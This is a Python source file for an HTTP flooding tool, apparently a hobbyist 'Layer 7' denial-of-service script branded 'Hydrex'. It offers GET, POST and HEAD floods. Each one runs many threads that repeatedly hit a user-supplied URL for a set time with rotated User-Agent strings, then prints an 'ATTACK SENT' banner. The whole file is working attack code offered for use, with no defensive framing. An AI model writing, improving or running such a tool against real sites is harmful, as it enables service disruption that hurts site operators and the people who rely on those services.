import threading
import datetime
import threading
import requests
import os
import random
import time

useragent = open("ua.txt").read().splitlines()

hydrex = "\033[38;5;196m"
red = "\033[38;5;196m"
clear = "\033[0m"
lila = "\033[38;5;165m"

def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""
 Created by {lila}Hydrex{clear}     |{hydrex} Copyright {clear}| 
          {hydrex}
                 __   _____  _________    ____
                / /  / _ \ \/ / __/ _ \  /_  /
               / /__/ __ |\  / _// , _/   / / 
              /____/_/ |_|/_/___/_/|_|   /_/  
                                       {clear}
                         By Hydrex
           {hydrex}╔═══════════════════════════════════{clear}
           {hydrex}║{clear}  {hydrex}-{clear} get      {hydrex}|{clear} GET Requests Flood  {hydrex}║{clear}         
           {hydrex}║{clear}  {hydrex}-{clear} post     {hydrex}|{clear} POST Requests Flood {hydrex}║{clear}
           {hydrex}║{clear}  {hydrex}-{clear} head     {hydrex}|{clear} HEAD Requests Flood {hydrex}║{clear}
           {hydrex}╚═══════════════════════════════════{clear}

""")              
    
def layer7():
    while True:
        banner()
        select = input(f"""
╔═══[{hydrex}type{clear}@{hydrex}Hydrex{clear}]
╚══{hydrex}>{clear} """)
         
        if select.startswith("get"):
            parts = select.split()
            if len(parts) != 4:
                print(f"usage{hydrex}:{clear} {hydrex}get{clear} <{hydrex}url{clear}> <{hydrex}threads{clear}> <{hydrex}duration{clear}>")
                input()
                continue

            _, url, threads, duration = parts
            threads = int(threads)
            duration = int(duration)

            def get(url, until_datetime):
                try:
                    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
                        ua = random.choice(useragent)
                        headers = {"User-Agent": ua}
                        requests.get(url, headers=headers, timeout=5)
                except:
                    pass

            def th(url, threads, duration):
                until = datetime.datetime.now() + datetime.timedelta(seconds=int(duration))
                for _ in range(int(threads)):
                    try:
                        t = threading.Thread(target=get, args=(url, until))
                        t.start()
                    except:
                        pass

            th(url, threads, duration)
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"""
 Created by {lila}Hydrex{clear}     |{hydrex} Copyright {clear}|  
                    {hydrex}                    
       ___ _______________  _______ __    _________  ________
      / _ /_  __/_  __/ _ |/ ___/ //_/   / __/ __/ |/ /_  __/
     / __ |/ /   / / / __ / /__/ ,<     _\ \/ _//    / / /   
    /_/ |_/_/   /_/ /_/ |_\___/_/|_|   /___/___/_/|_/ /_/    
                                                              
                    {clear}
      {hydrex}╔══════════════════════════════════{clear}
      {hydrex}║{clear} METHODS{hydrex}:{clear} {hydrex}[{clear}GET Requests{hydrex}]{clear} 
      {hydrex}║{clear} URL{hydrex}:{clear} {hydrex}[{clear}{url}{hydrex}]{clear}                
      {hydrex}║{clear} THREADS{hydrex}:{clear} {hydrex}[{clear}{threads}{hydrex}]{clear}                   
      {hydrex}║{clear} TIME{hydrex}:{clear} {hydrex}[{clear}{duration}{hydrex}]{clear}                     
      {hydrex}╚══════════════════════════════════{clear}       
""")
            time.sleep(duration)

################################################################################################################################

        elif select.startswith("post"):
            parts = select.split()
            if len(parts) != 4:
                print(f"usage{hydrex}:{clear} {hydrex}post{clear} <{hydrex}url{clear}> <{hydrex}threads{clear}> <{hydrex}duration{clear}>")
                input()
                continue

            _, url, threads, duration = parts
            threads = int(threads)
            duration = int(duration)

            def post(url, until_datetime):
                try:
                    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
                        ua = random.choice(useragent)
                        headers = {"User-Agent": ua}
                        requests.post(url, headers=headers, timeout=5)
                except:
                    pass

            def th(url, threads, duration):
                until = datetime.datetime.now() + datetime.timedelta(seconds=int(duration))
                for _ in range(int(threads)):
                    try:
                        t = threading.Thread(target=post, args=(url, until))
                        t.start()
                    except:
                        pass

            th(url, threads, duration)
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"""
 Created by {lila}Hydrex{clear}     |{hydrex} Copyright {clear}| 
                    {hydrex}                    
       ___ _______________  _______ __    _________  ________
      / _ /_  __/_  __/ _ |/ ___/ //_/   / __/ __/ |/ /_  __/
     / __ |/ /   / / / __ / /__/ ,<     _\ \/ _//    / / /   
    /_/ |_/_/   /_/ /_/ |_\___/_/|_|   /___/___/_/|_/ /_/    
                                                              
                    {clear}
      {hydrex}╔══════════════════════════════════{clear}
      {hydrex}║{clear} METHODS{hydrex}:{clear} {hydrex}[{clear}POST Requests{hydrex}]{clear} 
      {hydrex}║{clear} URL{hydrex}:{clear} {hydrex}[{clear}{url}{hydrex}]{clear}                
      {hydrex}║{clear} THREADS{hydrex}:{clear} {hydrex}[{clear}{threads}{hydrex}]{clear}                   
      {hydrex}║{clear} TIME{hydrex}:{clear} {hydrex}[{clear}{duration}{hydrex}]{clear}                     
      {hydrex}╚══════════════════════════════════{clear}       
""")
            time.sleep(duration)

################################################################################################################################

        elif select.startswith("head"):
            parts = select.split()
            if len(parts) != 4:
                print(f"usage{hydrex}:{clear} {hydrex}post{clear} <{hydrex}url{clear}> <{hydrex}threads{clear}> <{hydrex}duration{clear}>")
                input()
                continue

            _, url, threads, duration = parts
            threads = int(threads)
            duration = int(duration)

            def head(url, until_datetime):
                try:
                    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
                        ua = random.choice(useragent)
                        headers = {"User-Agent": ua}
                        requests.head(url, headers=headers, timeout=5)
                except:
                    pass

            def th(url, threads, duration):
                until = datetime.datetime.now() + datetime.timedelta(seconds=int(duration))
                for _ in range(int(threads)):
                    try:
                        t = threading.Thread(target=head, args=(url, until))
                        t.start()
                    except:
                        pass

            th(url, threads, duration)
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"""
 Created by {lila}Hydrex{clear}     |{hydrex} Copyright {clear}| 
                    {hydrex}                    
       ___ _______________  _______ __    _________  ________
      / _ /_  __/_  __/ _ |/ ___/ //_/   / __/ __/ |/ /_  __/
     / __ |/ /   / / / __ / /__/ ,<     _\ \/ _//    / / /   
    /_/ |_/_/   /_/ /_/ |_\___/_/|_|   /___/___/_/|_/ /_/    
                                                              
                    {clear}
      {hydrex}╔══════════════════════════════════{clear}
      {hydrex}║{clear} METHODS{hydrex}:{clear} {hydrex}[{clear}HEAD Requests{hydrex}]{clear}   
      {hydrex}║{clear} URL{hydrex}:{clear} {hydrex}[{clear}{url}{hydrex}]{clear}                
      {hydrex}║{clear} THREADS{hydrex}:{clear} {hydrex}[{clear}{threads}{hydrex}]{clear}                   
      {hydrex}║{clear} TIME{hydrex}:{clear} {hydrex}[{clear}{duration}{hydrex}]{clear}                     
      {hydrex}╚══════════════════════════════════{clear}       
""")
            time.sleep(duration)


if __name__ == "__main__":
    layer7()



